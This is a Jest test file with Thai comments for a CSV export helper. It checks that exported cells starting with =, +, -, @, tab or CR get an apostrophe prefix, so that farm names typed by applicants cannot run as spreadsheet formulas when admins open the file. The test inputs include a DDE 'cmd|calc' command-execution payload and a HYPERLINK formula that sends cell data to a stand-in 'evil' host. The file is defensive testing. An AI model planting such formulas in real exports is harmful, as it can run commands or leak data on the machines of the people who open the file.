/**
 * ไฟล์ CSV ที่เราสร้าง ต้องไม่กลายเป็นโปรแกรมเมื่อผู้ดูแลเปิดใน Excel
 *
 * Excel และ LibreOffice ลอกเครื่องหมายคำพูดออกก่อน แล้วประเมินช่องที่ขึ้นต้นด้วย
 * = + - @ แท็บ หรือ CR เป็นสูตร (CWE-1236) · การใส่คำพูดตาม RFC 4180 แก้เรื่อง
 * ตัวคั่น ไม่ได้แก้เรื่องนี้
 *
 * ระบบตัดสินเรื่องนี้ไปแล้วฝั่ง backend (audit C5-04 — apps/backend/shared/csv-utils.js
 * ใช้อยู่ที่ 4 จุด) แต่ตัวส่งออกฝั่งเบราว์เซอร์ 3 ตัวไม่ได้ตามมาด้วย ทั้งที่ข้อมูล
 * ในนั้นมาจากช่องที่ผู้ยื่นพิมพ์เอง — ชื่อฟาร์มถูกตรวจแค่ว่ามีค่าหรือไม่
 * (routes/api/farm/farms.js:161) แล้วถูกคัดลอกขึ้นแถวใบรับรองตรง ๆ
 *
 * เส้นทาง: ผู้ยื่นตั้งชื่อฟาร์มขึ้นต้นด้วย `=` -> ค่านอนในฐานข้อมูล -> ผู้ดูแลเปิด
 * /admin/certificates กดส่งออก -> เปิดไฟล์บนเครื่องตัวเอง
 */

import fs from 'fs';
import path from 'path';

import { csvCell, csvRow, neutralizeCsvFormula } from '../csv';

const TAB = String.fromCharCode(9);
const CR = String.fromCharCode(13);

const SRC = path.join(__dirname, '..', '..');

describe('ช่องที่ Excel จะประเมินเป็นสูตร ต้องถูกทำให้เป็นข้อความ', () => {
  const TRIGGERS = [
    '=cmd|calc!A0',
    '=HYPERLINK("http://evil/"&A1,"click")',
    '+1+1',
    '-1+1',
    '@SUM(A1:A9)',
    `${TAB}=1+1`,
    `${CR}=1+1`,
  ];

  it.each(TRIGGERS)('%j ถูกเติม apostrophe นำหน้า', (value) => {
    expect(neutralizeCsvFormula(value)).toBe(`'${value}`);
    // และเมื่อผ่าน csvCell ผลลัพธ์ต้องไม่ขึ้นต้นด้วยตัวกระตุ้น ไม่ว่าจะถูกใส่คำพูดหรือไม่
    const cell = csvCell(value);
    const inner = cell.startsWith('"') ? cell.slice(1) : cell;
    expect(inner.startsWith("'")).toBe(true);
  });

  it('ชื่อฟาร์มที่ผู้ยื่นตั้งเอง กลายเป็นข้อความ ไม่ใช่คำสั่ง', () => {
    const farmName = '=cmd|\'/c calc\'!A0';
    const row = csvRow(['GACP-TH-2569-000001', farmName, 'CERTIFIED']);
    expect(row).toContain(`'${farmName}`.slice(0, 5));
    expect(row.split(',')[1].replace(/^"/, '').startsWith("'")).toBe(true);
  });
});

describe('ข้อความปกติไม่ถูกดัดแปลง และตัวคั่นยังทำงาน', () => {
  it('ชื่อไทยธรรมดาผ่านตรง ๆ', () => {
    expect(csvCell('สวนสมใจ')).toBe('สวนสมใจ');
    expect(neutralizeCsvFormula('สวนสมใจ')).toBe('สวนสมใจ');
  });

  it('ค่าที่มีลูกน้ำยังถูกใส่คำพูด — คอลัมน์ไม่เลื่อน', () => {
    expect(csvCell('99/1 หมู่ 4, ต.สันทราย')).toBe('"99/1 หมู่ 4, ต.สันทราย"');
  });

  it('เครื่องหมายคำพูดในค่า ถูกทำซ้ำตาม RFC 4180', () => {
    expect(csvCell('เรียก "สวนลุง"')).toBe('"เรียก ""สวนลุง"""');
  });

  it('ตัวเลขและค่าว่าง', () => {
    expect(csvCell(42)).toBe('42');
    expect(csvCell(null)).toBe('');
    expect(csvCell(undefined)).toBe('');
  });

  it('ตัดสินเหมือนฝั่ง backend ทุกกรณี', () => {
    const backend = fs.readFileSync(
      path.join(SRC, '..', '..', 'backend', 'shared', 'csv-utils.js'),
      'utf8',
    );
    const trigger = backend.match(/\/\^\[([^\]]+)\]\//);
    expect(trigger).not.toBeNull();
    // ชุดอักขระต้องตรงกัน — ถ้าฝั่งใดฝั่งหนึ่งขยาย อีกฝั่งต้องตามทันที
    expect(trigger![1]).toBe('=+\\-@\\t\\r');
  });
});

describe('ไม่มีตัวส่งออกไหนสร้างแถวเองโดยข้ามตัวกลาง', () => {
  const EXPORTERS = [
    'app/admin/certificates/client-view.tsx',
    'app/provider/scheduler/queue/client-view.tsx',
    'app/provider/analytics/work/client-view.tsx',
    // ตัวนี้แย่ที่สุดในสี่ตัว: เดิม r.join(',') เปล่า ๆ ไม่มีแม้แต่การใส่คำพูด
    'app/provider/accounting/accounting-dashboard-client.tsx',
  ];

  it.each(EXPORTERS)('%s ใช้ lib/csv', (rel) => {
    const src = fs.readFileSync(path.join(SRC, rel), 'utf8');
    expect(src).toMatch(/from ['"]@\/lib\/csv['"]/);
  });

  it.each(EXPORTERS)('%s ไม่มีตัวใส่คำพูดของตัวเองเหลืออยู่', (rel) => {
    const src = fs.readFileSync(path.join(SRC, rel), 'utf8');
    // รูปแบบที่เคยเป็นปัญหา: ใส่คำพูดอย่างเดียวแล้ว join ด้วยลูกน้ำ
    expect(src).not.toMatch(/replace\(\/"\/g, '""'\)/);
  });
});
